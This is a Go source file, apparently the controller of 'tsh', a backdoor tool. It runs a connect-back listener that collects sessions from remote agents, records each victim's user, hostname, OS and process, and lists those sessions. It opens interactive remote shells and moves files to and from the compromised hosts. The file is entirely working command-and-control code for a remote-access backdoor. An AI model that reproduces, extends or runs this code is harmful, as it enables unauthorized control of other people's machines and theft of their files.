package tsh

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"text/tabwriter"
	"time"

	"tsh-go/internal/constants"
	"tsh-go/internal/pel"
	"tsh-go/internal/utils"

	"github.com/schollz/progressbar/v3"
	"golang.org/x/crypto/ssh/terminal"
)

type Session struct {
	ID         int
	Conn       *pel.PktEncLayer
	RemoteAddr net.Addr
	Connected  time.Time
	User       string
	Hostname   string
	OS         string
	PID        string
	Process    string

	ShellStarted bool
	OutputChan   chan []byte
	CloseChan    chan struct{}

	AgentStartTime time.Time
}

var (
	sessions   = make(map[int]*Session)
	sessionMux sync.Mutex
	nextID     = 1
	Debug      = false
	DebugFile  *os.File
)

func LogDebug(format string, a ...interface{}) {
	if Debug {
		msg := fmt.Sprintf(format, a...)
		if DebugFile != nil {
			timestamp := time.Now().Format("15:04:05.000")
			DebugFile.WriteString(fmt.Sprintf("[%s] %s\n", timestamp, msg))
			DebugFile.Sync()
		} else {
			fmt.Printf("\r\n[DEBUG] "+format+"\r\n", a...)
		}
	}
}

func Run() {
	var secret string
	var port int

	flagset := flag.NewFlagSet(filepath.Base(os.Args[0]), flag.ExitOnError)
	flagset.StringVar(&secret, "s", "1234", "secret")
	flagset.IntVar(&port, "p", 1234, "port")
	flagset.Usage = func() {
		fmt.Fprintf(flagset.Output(), "Usage: ./%s [-s secret] [-p port] <action> [debug]\n", flagset.Name())
		fmt.Fprintf(flagset.Output(), "  action:\n")
		fmt.Fprintf(flagset.Output(), "        <hostname|cb> [command]\n")
		fmt.Fprintf(flagset.Output(), "        <hostname|cb> get <source-file> <dest-dir>\n")
		fmt.Fprintf(flagset.Output(), "        <hostname|cb> put <source-file> <dest-dir>\n")
		flagset.PrintDefaults()
	}
	flagset.Parse(os.Args[1:])

	args := flagset.Args()

	// Check for debug flag
	newArgs := []string{}
	for _, arg := range args {
		if arg == "debug" {
			Debug = true
		} else {
			newArgs = append(newArgs, arg)
		}
	}
	args = newArgs

	if Debug {
		var err error
		DebugFile, err = os.OpenFile("tsh_debug.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
		if err != nil {
			fmt.Println("Failed to open debug log:", err)
		}
	}

	if len(args) == 0 {
		flagset.Usage()
		os.Exit(0)
	}

	var host string
	var isConnectBack bool

	if args[0] == "cb" {
		isConnectBack = true
	} else {
		host = args[0]
	}
	args = args[1:]

	// Mode parsing
	var mode uint8
	var srcfile, dstdir, command string

	command = "exec bash --login"
	switch {
	case len(args) == 0:
		mode = constants.RunShell
	case args[0] == "get" && len(args) == 3:
		mode = constants.GetFile
		srcfile = args[1]
		dstdir = args[2]
	case args[0] == "put" && len(args) == 3:
		mode = constants.PutFile
		srcfile = args[1]
		dstdir = args[2]
	default:
		mode = constants.RunShell
		command = args[0]
	}

	if isConnectBack {
		// Multi-session Connect Back Manager
		addr := fmt.Sprintf(":%d", port)
		ln, err := pel.Listen(addr, secret, false)
		if err != nil {
			fmt.Println("Address already in use.")
			os.Exit(1)
		}
		defer ln.Close()

		fmt.Printf("[*] Listening on %s for incoming connections...\n", addr)
		fmt.Println("[*] Type 'help' for commands.")

		// Background listener
		go func() {
			for {
				layer, err := ln.Accept()
				if err != nil {
					// Listener closed or error
					return
				}

				// Read metadata with timeout to support old clients (sort of)
				// New clients send it immediately.
				// Format: user@hostname|os/arch|pid|process|starttime
				metaBuf := make([]byte, 1024)
				userStr, hostStr, osStr := "Unknown", "Unknown", "Unknown"
				pidStr, procStr := "?", "?"
				var startTime time.Time

				n, err := layer.ReadTimeout(metaBuf, 2*time.Second)
				if err == nil && n > 0 {
					meta := string(metaBuf[:n])
					// Parse
					parts := strings.Split(meta, "|")
					if len(parts) >= 2 {
						// part[0] = user@hostname, part[1] = os/arch
						uh := strings.Split(parts[0], "@")
						if len(uh) == 2 {
							userStr = uh[0]
							hostStr = uh[1]
						}
						osStr = parts[1]
					}
					if len(parts) >= 4 {
						pidStr = parts[2]
						procStr = parts[3]
					}
					if len(parts) >= 5 {
						if ts, err := strconv.ParseInt(parts[4], 10, 64); err == nil {
							startTime = time.Unix(ts, 0)
						}
					}
				}

				sessionMux.Lock()
				id := nextID
				nextID++
				session := &Session{
					ID:             id,
					Conn:           layer,
					RemoteAddr:     layer.Addr(),
					Connected:      time.Now(),
					User:           userStr,
					Hostname:       hostStr,
					OS:             osStr,
					PID:            pidStr,
					Process:        procStr,
					OutputChan:     make(chan []byte, 100),
					AgentStartTime: startTime,
				}
				// PktEncLayer doesn't expose RemoteAddr directly in the struct but we can try to get it if we exposed it.
				// For now, just store it.
				sessions[id] = session
				sessionMux.Unlock()

				// Start persistent reader loop
				go func(s *Session) {
					defer close(s.OutputChan)
					buf := make([]byte, constants.Bufsize)
					for {
						n, err := s.Conn.Read(buf)
						if err != nil {
							return
						}
						data := make([]byte, n)
						copy(data, buf[:n])
						s.OutputChan <- data
					}
				}(session)

				// Print to stdout directly? But we are in a terminal prompt.
				// If we are using NewTerminal, writing to stdout might mess up the prompt line.
				// NewTerminal has Write method.
				// But we need access to 'term' here.
				// For now, just fmt.Printf, it might garble the prompt but user will see it.
				fmt.Printf("\r[+] New session %d opened.\r\n", id)
				// We might need to reprint prompt?
				// term.Write([]byte("tsh> "))?
			}
		}()

		// Command Loop
		// Use NewTerminal for better interaction
		oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
		if err != nil {
			fmt.Println("Failed to set raw mode:", err)
			os.Exit(1)
		}
		defer terminal.Restore(int(os.Stdin.Fd()), oldState)

		term := terminal.NewTerminal(os.Stdin, "tsh> ")

		for {
			line, err := term.ReadLine()
			if err != nil {
				if err == io.EOF {
					break
				}
				break
			}

			line = strings.TrimSpace(line)
			parts := strings.Fields(line)
			if len(parts) == 0 {
				continue
			}

			cmd := parts[0]
			switch cmd {
			case "help", "?":
				term.Write([]byte("Commands:\r\n"))
				term.Write([]byte("  list, sessions    List active sessions\r\n"))
				term.Write([]byte("  interact <id>     Interact with a session\r\n"))
				term.Write([]byte("  kill <id>         Terminate remote daemon\r\n"))
				term.Write([]byte("  download <id> ... Download file (usage: download <id> <remote_file> <local_dir>)\r\n"))
				term.Write([]byte("  upload <id> ...   Upload file (usage: upload <id> <local_file> <remote_dir>)\r\n"))
				term.Write([]byte("  use <id>          Alias for interact\r\n"))
				term.Write([]byte("  exit, quit        Exit server\r\n"))
				term.Write([]byte("\r\nInteractive commands:\r\n"))
				term.Write([]byte("  tshdbg<Enter>     Detach from session (background)\r\n"))
				term.Write([]byte("  tshdexit<Enter>   Terminate remote daemon\r\n"))
				term.Write([]byte("  tshdget <remote> <local>  Download file during interaction\r\n"))
				term.Write([]byte("  tshdput <local> <remote>  Upload file during interaction\r\n"))
			case "list", "sessions":
				printSessionsToTerm(term)
			case "interact", "use":
				if len(parts) < 2 {
					term.Write([]byte("Usage: interact <id>\r\n"))
					break
				}
				id, err := strconv.Atoi(parts[1])
				if err != nil {
					term.Write([]byte("Invalid ID\r\n"))
					break
				}

				// Restore terminal for interaction
				terminal.Restore(int(os.Stdin.Fd()), oldState)
				handleSessionInteraction(id, mode, command, srcfile, dstdir)
				// Re-enable raw mode
				terminal.MakeRaw(int(os.Stdin.Fd()))

			case "download", "get":
				if len(parts) < 4 {
					term.Write([]byte("Usage: download <id> <remote_file> <local_dir>\r\n"))
					break
				}
				id, err := strconv.Atoi(parts[1])
				if err != nil {
					term.Write([]byte("Invalid ID\r\n"))
					break
				}
				handleSessionInteraction(id, constants.GetFile, "", parts[2], parts[3])

			case "upload", "put":
				if len(parts) < 4 {
					term.Write([]byte("Usage: upload <id> <local_file> <remote_dir>\r\n"))
					break
				}
				id, err := strconv.Atoi(parts[1])
				if err != nil {
					term.Write([]byte("Invalid ID\r\n"))
					break
				}
				handleSessionInteraction(id, constants.PutFile, "", parts[2], parts[3])

			case "kill":
				if len(parts) < 2 {
					term.Write([]byte("Usage: kill <id>\r\n"))
					break
				}
				id, err := strconv.Atoi(parts[1])
				if err != nil {
					term.Write([]byte("Invalid ID\r\n"))
					break
				}
				// Send Terminate command
				handleSessionInteraction(id, constants.Terminate, "", "", "")
				term.Write([]byte("Sent terminate signal.\r\n"))

			case "exit", "quit":
				terminal.Restore(int(os.Stdin.Fd()), oldState)
				fmt.Println("Exiting...")
				os.Exit(0)
			default:
				term.Write([]byte("Unknown command\r\n"))
			}
		}

	} else {
		// Standard Connect Mode (Single session)
		addr := fmt.Sprintf("%s:%d", host, port)
		layer, err := pel.Dial(addr, secret, false)
		if err != nil {
			fmt.Print("Password:")
			fmt.Scanln() // simple wait
			fmt.Println("Authentication failed or connection refused.")
			os.Exit(1)
		}
		defer layer.Close()

		// Create a temporary session wrapper for single-mode interaction
		session := &Session{
			Conn:       layer,
			OutputChan: make(chan []byte, 100),
		}

		// Start reader loop for this session
		go func(s *Session) {
			defer close(s.OutputChan)
			buf := make([]byte, constants.Bufsize)
			for {
				n, err := s.Conn.Read(buf)
				if err != nil {
					return
				}
				data := make([]byte, n)
				copy(data, buf[:n])
				s.OutputChan <- data
			}
		}(session)

		// Execute single command/action
		executeAction(session, mode, command, srcfile, dstdir)
	}
}

func printSessionsToTerm(term *terminal.Terminal) {
	sessionMux.Lock()
	defer sessionMux.Unlock()

	var buf bytes.Buffer
	w := tabwriter.NewWriter(&buf, 0, 0, 2, ' ', 0)
	// Header with colors
	// ID (Green), IP (Blue), User (Cyan), Hostname (Yellow), OS (Magenta), PID (Red), Process (White), Uptime (Cyan)
	fmt.Fprintln(w, "\x1b[32mID\x1b[0m\t\x1b[34mIP\x1b[0m\t\x1b[36mUser\x1b[0m\t\x1b[33mHostname\x1b[0m\t\x1b[35mOS\x1b[0m\t\x1b[31mPID\x1b[0m\t\x1b[37mProcess\x1b[0m\t\x1b[36mUptime\x1b[0m")

	for id, s := range sessions {
		ip := s.RemoteAddr.String()
		// Strip port
		if host, _, err := net.SplitHostPort(ip); err == nil {
			ip = host
		}

		uptime := "N/A"
		if !s.AgentStartTime.IsZero() {
			uptime = time.Since(s.AgentStartTime).Round(time.Second).String()
		}

		fmt.Fprintf(w, "\x1b[32m%d\x1b[0m\t\x1b[34m%s\x1b[0m\t\x1b[36m%s\x1b[0m\t\x1b[33m%s\x1b[0m\t\x1b[35m%s\x1b[0m\t\x1b[31m%s\x1b[0m\t\x1b[37m%s\x1b[0m\t\x1b[36m%s\x1b[0m\n",
			id, ip, s.User, s.Hostname, s.OS, s.PID, s.Process, uptime)
	}
	w.Flush()
	term.Write(bytes.ReplaceAll(buf.Bytes(), []byte("\n"), []byte("\r\n")))
}

func handleSessionInteraction(id int, mode uint8, command, srcfile, dstdir string) {
	sessionMux.Lock()
	session, ok := sessions[id]
	sessionMux.Unlock()

	if !ok {
		fmt.Println("Session not found.")
		return
	}

	fmt.Printf("[*] Interacting with session %d...\n", id)

	// Check if session is already running a shell
	if session.ShellStarted {
		if mode != constants.RunShell && mode != constants.Terminate {
			fmt.Println("Session is busy running a shell. You cannot perform other actions.")
			return
		}
		// If Terminate, send 0x1D + Terminate
		if mode == constants.Terminate {
			_, err := session.Conn.Write([]byte{0x1D, constants.Terminate})
			if err != nil {
				fmt.Println("Error writing to session:", err)
			}
			// Give time for the agent to receive the signal and exit itself
			time.Sleep(500 * time.Millisecond)
			removeSession(id)
			return
		}
		// Resume shell
	} else {
		// Send mode
		_, err := session.Conn.Write([]byte{mode})
		if err != nil {
			fmt.Println("Error writing to session:", err)
			removeSession(id)
			return
		}
		// Do not set ShellStarted here, let handleRunShell do it after handshake
	}

	keepSession := executeAction(session, mode, command, srcfile, dstdir)

	if !keepSession {
		removeSession(id)
		fmt.Println("\n[*] Session finished.")
	} else {
		fmt.Println("\n[*] Detached from session.")
	}
}

func removeSession(id int) {
	sessionMux.Lock()
	defer sessionMux.Unlock()
	if s, ok := sessions[id]; ok {
		s.Conn.Close()
		delete(sessions, id)
	}
}

func executeAction(session *Session, mode uint8, command, srcfile, dstdir string) bool {
	switch mode {
	case constants.RunShell:
		return handleRunShell(session, command)
	case constants.GetFile:
		chanReader := &ChanReader{ch: session.OutputChan}
		handleGetFile(chanReader, session.Conn, srcfile, dstdir)
		return false
	case constants.PutFile:
		chanReader := &ChanReader{ch: session.OutputChan}
		handlePutFile(chanReader, session.Conn, srcfile, dstdir)
		return false
	case constants.Terminate:
		// Terminate command doesn't need payload, just mode byte was sent
		return false
	}
	return false
}

type ChanReader struct {
	ch  chan []byte
	buf []byte
}

func (r *ChanReader) Read(p []byte) (n int, err error) {
	if len(r.buf) > 0 {
		n = copy(p, r.buf)
		r.buf = r.buf[n:]
		return n, nil
	}
	data, ok := <-r.ch
	if !ok {
		return 0, io.EOF
	}
	n = copy(p, data)
	if n < len(data) {
		r.buf = data[n:]
	}
	return n, nil
}

func (r *ChanReader) Sync(opcode byte) error {
	LogDebug("ChanReader.Sync: Waiting for opcode 0x%X", opcode)
	for {
		// Check if we have buffered data first
		if len(r.buf) > 0 {
			LogDebug("ChanReader.Sync: Scanning buffered %d bytes", len(r.buf))
			// Scan buffer for 0x1D, opcode
			for i := 0; i < len(r.buf)-1; i++ {
				if r.buf[i] == 0x1D && r.buf[i+1] == opcode {
					LogDebug("ChanReader.Sync: Found opcode at index %d", i)
					// Found it!
					// Consume everything up to and including the opcode
					r.buf = r.buf[i+2:]
					return nil
				}
			}

			// Not found in current buffer.
			// Be careful not to discard a trailing 0x1D which might be the start of our sequence.
			if r.buf[len(r.buf)-1] == 0x1D {
				LogDebug("ChanReader.Sync: Opcode not found, but found trailing 0x1D. Keeping it.")
				r.buf = []byte{0x1D}
			} else {
				LogDebug("ChanReader.Sync: Opcode not found in buffer, discarding")
				r.buf = nil
			}
		}

		LogDebug("ChanReader.Sync: Waiting for data...")
		data, ok := <-r.ch
		if !ok {
			return io.EOF
		}
		LogDebug("ChanReader.Sync: Received %d bytes: % X", len(data), data)
		// Append new data to existing buffer (which might contain a saved 0x1D)
		r.buf = append(r.buf, data...)
	}
}

func handleGetFile(reader *ChanReader, writer io.Writer, srcfile, dstPath string) {
	LogDebug("handleGetFile: Starting download of %s to %s", srcfile, dstPath)
	buffer := make([]byte, constants.Bufsize)

	var finalPath string
	info, err := os.Stat(dstPath)
	if err == nil && info.IsDir() {
		basename := strings.ReplaceAll(srcfile, "\\", "/")
		basename = filepath.Base(filepath.FromSlash(basename))
		finalPath = filepath.Join(dstPath, basename)
	} else {
		finalPath = dstPath
	}

	f, err := os.OpenFile(finalPath, os.O_CREATE|os.O_RDWR, 0644)
	if err != nil {
		fmt.Println("Local Error:", err)
		return
	}
	defer f.Close()

	LogDebug("handleGetFile: Sending filename...")
	_, err = writer.Write([]byte(srcfile))
	if err != nil {
		return
	}

	// Sync with server (wait for ACK)
	err = reader.Sync(constants.GetFile)
	if err != nil {
		fmt.Println("Sync Error:", err)
		return
	}
	LogDebug("handleGetFile: Synced with server")

	// Check Remote Status
	status := make([]byte, 1)
	_, err = io.ReadFull(reader, status)
	if err != nil {
		fmt.Println("Network Error:", err)
		return
	}
	LogDebug("handleGetFile: Status byte: %d", status[0])
	if status[0] == 0 {
		// Failure
		n, _ := reader.Read(buffer)
		fmt.Println("Remote Error:", string(buffer[:n]))
		return
	}

	// Read Size
	sizeBuf := make([]byte, 8)
	_, err = io.ReadFull(reader, sizeBuf)
	if err != nil {
		fmt.Println("Network Error (Size):", err)
		return
	}
	var size int64
	for i := 0; i < 8; i++ {
		size = (size << 8) | int64(sizeBuf[i])
	}
	LogDebug("handleGetFile: File size: %d", size)

	bar := progressbar.NewOptions64(size,
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Downloading"),
		progressbar.OptionSetTheme(progressbar.Theme{
			Saucer:        "=",
			SaucerHead:    ">",
			SaucerPadding: "-",
			BarStart:      "[",
			BarEnd:        "]",
		}),
	)
	io.CopyBuffer(io.MultiWriter(f, bar), io.LimitReader(reader, size), buffer)
	fmt.Print("\nDone.\n")
}

func handlePutFile(reader *ChanReader, writer io.Writer, srcfile, dstPath string) {
	LogDebug("handlePutFile: Starting upload of %s to %s", srcfile, dstPath)
	buffer := make([]byte, constants.Bufsize)
	f, err := os.Open(srcfile)
	if err != nil {
		fmt.Println("Local Error:", err)
		return
	}
	defer f.Close()
	fi, err := f.Stat()
	if err != nil {
		return
	}
	fsize := fi.Size()

	var remotePath string
	// Check if dstPath looks like a directory (trailing slash)
	if strings.HasSuffix(dstPath, "/") || strings.HasSuffix(dstPath, "\\") {
		basename := filepath.Base(srcfile)
		// Ensure separator
		remotePath = dstPath + basename
	} else {
		remotePath = dstPath
	}

	LogDebug("handlePutFile: Sending filename %s...", remotePath)
	_, err = writer.Write([]byte(remotePath))
	if err != nil {
		fmt.Println(err)
		return
	}

	// Sync with server (wait for ACK)
	err = reader.Sync(constants.PutFile)
	if err != nil {
		fmt.Println("Sync Error:", err)
		return
	}
	LogDebug("handlePutFile: Synced with server")

	// Check Remote Status
	status := make([]byte, 1)
	_, err = reader.Read(status)
	if err != nil {
		fmt.Println("Network Error:", err)
		return
	}
	LogDebug("handlePutFile: Status byte: %d", status[0])
	if status[0] == 0 {
		// Failure
		n, _ := reader.Read(buffer)
		fmt.Println("Remote Error:", string(buffer[:n]))
		return
	}

	// Send Size
	LogDebug("handlePutFile: Sending size %d...", fsize)
	sizeBuf := make([]byte, 8)
	for i := 0; i < 8; i++ {
		sizeBuf[i] = byte(fsize >> (56 - 8*i))
	}
	_, err = writer.Write(sizeBuf)
	if err != nil {
		return
	}

	bar := progressbar.NewOptions64(fsize,
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Uploading"),
		progressbar.OptionSetTheme(progressbar.Theme{
			Saucer:        "=",
			SaucerHead:    ">",
			SaucerPadding: "-",
			BarStart:      "[",
			BarEnd:        "]",
		}),
	)
	utils.CopyBuffer(io.MultiWriter(writer, bar), f, buffer)
	fmt.Print("\nDone.\n")
}

func handleRunShell(session *Session, command string) bool {
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		return false
	}

	defer func() {
		_ = terminal.Restore(int(os.Stdin.Fd()), oldState)
	}()

	if !session.ShellStarted {
		term := os.Getenv("TERM")
		if term == "" {
			term = "vt100"
		}
		_, err = session.Conn.Write([]byte(term))
		if err != nil {
			return false
		}

		ws_col, ws_row, _ := terminal.GetSize(int(os.Stdout.Fd()))
		ws := make([]byte, 4)
		ws[0] = byte((ws_row >> 8) & 0xFF)
		ws[1] = byte((ws_row) & 0xFF)
		ws[2] = byte((ws_col >> 8) & 0xFF)
		ws[3] = byte((ws_col) & 0xFF)
		_, err = session.Conn.Write(ws)
		if err != nil {
			return false
		}

		_, err = session.Conn.Write([]byte(command))
		if err != nil {
			return false
		}
		session.ShellStarted = true
	}

	actionChan := make(chan int) // 0: remote closed, 1: detach, 2: terminate
	stopChan := make(chan struct{})

	defer func() {
		close(stopChan)
		os.Stdin.SetReadDeadline(time.Time{}) // Clear deadline
	}()

	// Transfer coordination
	transferChan := make(chan []byte, 1024)
	var transferMode int32 = 0 // 0: Normal (Stdout), 1: Transfer (transferChan)

	// Output Loop
	var outputHistory []byte
	var outputHistoryMux sync.Mutex

	go func() {
		for {
			select {
			case data, ok := <-session.OutputChan:
				if !ok {
					actionChan <- 0
					return
				}
				// Check mode
				if atomic.LoadInt32(&transferMode) == 1 {
					// Forward to transfer channel
					select {
					case transferChan <- data:
					}
				} else {
					os.Stdout.Write(data)
					outputHistoryMux.Lock()
					outputHistory = append(outputHistory, data...)
					if len(outputHistory) > 4096 {
						outputHistory = outputHistory[len(outputHistory)-4096:]
					}
					outputHistoryMux.Unlock()
				}
			case <-actionChan:
				// If action received from input loop (or self), stop
				return
			}
		}
	}()

	// Input Loop
	go func() {
		buf := make([]byte, 128)
		var lastBytes []byte

		for {
			select {
			case <-stopChan:
				return
			default:
			}

			os.Stdin.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
			n, err := os.Stdin.Read(buf)
			if err != nil {
				if os.IsTimeout(err) {
					continue
				}
				return
			}

			for i := 0; i < n; i++ {
				b := buf[i]

				// Normal Mode processing
				lastBytes = append(lastBytes, b)
				if len(lastBytes) > 512 {
					lastBytes = lastBytes[len(lastBytes)-512:]
				}

				// Check for tshdbg
				if len(lastBytes) >= 7 {
					suffix := string(lastBytes[len(lastBytes)-7:])
					if suffix == "tshdbg\r" || suffix == "tshdbg\n" {
						actionChan <- 1
						return
					}
				}

				// Check for tshdget
				if len(lastBytes) >= 8 {
					suffix := string(lastBytes[len(lastBytes)-8:])
					if suffix == "tshdget\r" || suffix == "tshdget\n" {
						// Trigger Interactive Mode for Download
						// 1. Prompt for Source
						fmt.Print("\r\n[tshdget] Source Path: ")
						src, err := readRawInput()
						if err != nil || src == "" {
							fmt.Print("\r\nCancelled.\r\n")
							session.Conn.Write([]byte{0x0D}) // Send Enter to restore prompt
							lastBytes = nil
							continue
						}

						// 2. Prompt for Destination
						fmt.Print("\r\n[tshdget] Local Destination Path: ")
						dst, err := readRawInput()
						if err != nil || dst == "" {
							fmt.Print("\r\nCancelled.\r\n")
							session.Conn.Write([]byte{0x0D})
							lastBytes = nil
							continue
						}

						// 3. Execute
						fmt.Printf("\r\nDownloading '%s' to '%s'...\r\n", src, dst)

						// Send Ctrl+C to clear remote line (remote has "tshdget")
						session.Conn.Write([]byte{0x03})
						time.Sleep(100 * time.Millisecond)

						// Enable Transfer Mode
						atomic.StoreInt32(&transferMode, 1)

						// Drain transferChan
					drainLoopGet:
						for {
							select {
							case <-transferChan:
							default:
								break drainLoopGet
							}
						}

						session.Conn.Write([]byte{0x1D, constants.GetFile})
						terminal.Restore(int(os.Stdin.Fd()), oldState)
						chanReader := &ChanReader{ch: transferChan}

						// Try to parse CWD (optional, best effort)
						outputHistoryMux.Lock()
						hist := make([]byte, len(outputHistory))
						copy(hist, outputHistory)
						outputHistoryMux.Unlock()

						cwd := parseCwdFromPrompt(hist)
						logClientDebug("Parsed CWD: '%s'", cwd)

						if cwd != "" && !filepath.IsAbs(src) && !isWindowsAbs(src) {
							if strings.HasSuffix(cwd, "\\") || strings.HasSuffix(cwd, "/") {
								src = cwd + src
							} else {
								src = cwd + "\\" + src
							}
						}

						handleGetFile(chanReader, session.Conn, src, dst)
						terminal.MakeRaw(int(os.Stdin.Fd()))

						// Disable Transfer Mode
						atomic.StoreInt32(&transferMode, 0)
						session.Conn.Write([]byte{0x0D})
						lastBytes = nil
						continue
					}
				}

				// Check for tshdput
				if len(lastBytes) >= 8 {
					suffix := string(lastBytes[len(lastBytes)-8:])
					if suffix == "tshdput\r" || suffix == "tshdput\n" {
						// Trigger Interactive Mode for Upload
						// 1. Prompt for Source
						fmt.Print("\r\n[tshdput] Local Source Path: ")
						src, err := readRawInput()
						if err != nil || src == "" {
							fmt.Print("\r\nCancelled.\r\n")
							session.Conn.Write([]byte{0x0D})
							lastBytes = nil
							continue
						}

						// 2. Prompt for Destination
						fmt.Print("\r\n[tshdput] Remote Destination Path: ")
						dst, err := readRawInput()
						if err != nil || dst == "" {
							fmt.Print("\r\nCancelled.\r\n")
							session.Conn.Write([]byte{0x0D})
							lastBytes = nil
							continue
						}

						// 3. Execute
						fmt.Printf("\r\nUploading '%s' to '%s'...\r\n", src, dst)

						// Send Ctrl+C
						session.Conn.Write([]byte{0x03})
						time.Sleep(100 * time.Millisecond)

						// Enable Transfer Mode
						atomic.StoreInt32(&transferMode, 1)

						// Drain
					drainLoopPut:
						for {
							select {
							case <-transferChan:
							default:
								break drainLoopPut
							}
						}

						session.Conn.Write([]byte{0x1D, constants.PutFile})
						terminal.Restore(int(os.Stdin.Fd()), oldState)
						chanReader := &ChanReader{ch: transferChan}

						// Try to parse CWD
						outputHistoryMux.Lock()
						hist := make([]byte, len(outputHistory))
						copy(hist, outputHistory)
						outputHistoryMux.Unlock()

						cwd := parseCwdFromPrompt(hist)
						logClientDebug("Parsed CWD: '%s'", cwd)

						if cwd != "" && !filepath.IsAbs(dst) && !isWindowsAbs(dst) {
							if strings.HasSuffix(cwd, "\\") || strings.HasSuffix(cwd, "/") {
								dst = cwd + dst
							} else {
								dst = cwd + "\\" + dst
							}
						}

						handlePutFile(chanReader, session.Conn, src, dst)
						terminal.MakeRaw(int(os.Stdin.Fd()))

						// Disable Transfer Mode
						atomic.StoreInt32(&transferMode, 0)
						session.Conn.Write([]byte{0x0D})
						lastBytes = nil
						continue
					}
				}

				// If not captured, write to remote
				session.Conn.Write([]byte{b})
			}
		}
	}()

	action := <-actionChan
	return action == 1
}

func readRawInput() (string, error) {
	var input []byte
	buf := make([]byte, 1)
	for {
		n, err := os.Stdin.Read(buf)
		if err != nil {
			return "", err
		}
		if n == 0 {
			continue
		}
		b := buf[0]

		if b == '\r' || b == '\n' {
			return string(input), nil
		} else if b == 0x03 { // Ctrl+C
			return "", fmt.Errorf("interrupted")
		} else if b == 127 || b == 8 { // Backspace
			if len(input) > 0 {
				input = input[:len(input)-1]
				os.Stdout.Write([]byte("\b \b"))
			}
		} else {
			input = append(input, b)
			os.Stdout.Write([]byte{b})
		}
	}
}

func isWindowsAbs(path string) bool {
	// Check for drive letter: X:\ or X:/
	if len(path) >= 3 {
		if path[1] == ':' && (path[2] == '\\' || path[2] == '/') {
			c := path[0]
			if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') {
				return true
			}
		}
	}
	// Check for UNC path: \\ or //
	if len(path) >= 2 {
		if (path[0] == '\\' && path[1] == '\\') || (path[0] == '/' && path[1] == '/') {
			return true
		}
	}
	return false
}

func cleanAnsi(str string) string {
	re := regexp.MustCompile("\x1b\\[[0-9;]*[a-zA-Z]")
	return re.ReplaceAllString(str, "")
}

func parseCwdFromPrompt(data []byte) string {
	// Look for something ending in ">" before "tshdget"
	// We scan backwards from the end of data.
	// We expect "C:\Path\To\Dir>tshdget "
	// Or "C:\Path\To\Dir> tshdget "

	// Convert to string for easier searching
	s := string(data)
	logClientDebug("Parsing CWD from history (len=%d): %q", len(s), s)

	// Find the last ">"
	idx := strings.LastIndex(s, ">")
	if idx == -1 {
		return ""
	}

	// The path is before ">"
	// We need to find where the path starts.
	// Usually it starts after a newline or at the beginning of the buffer.
	// Scan backwards from idx
	start := -1
	for i := idx - 1; i >= 0; i-- {
		if s[i] == '\n' || s[i] == '\r' {
			start = i + 1
			break
		}
	}
	if start == -1 {
		start = 0
	}

	path := s[start:idx]
	path = strings.TrimSpace(path)

	// Basic validation: should contain ":" (e.g. C:) or start with "/"
	if strings.Contains(path, ":") || strings.HasPrefix(path, "/") {
		return cleanAnsi(path)
	}

	return ""
}

func logClientDebug(format string, args ...interface{}) {
	f, err := os.OpenFile("tsh_client_debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	msg := fmt.Sprintf(format, args...)
	f.WriteString(fmt.Sprintf("[%s] %s\n", time.Now().Format("15:04:05.000"), msg))
}
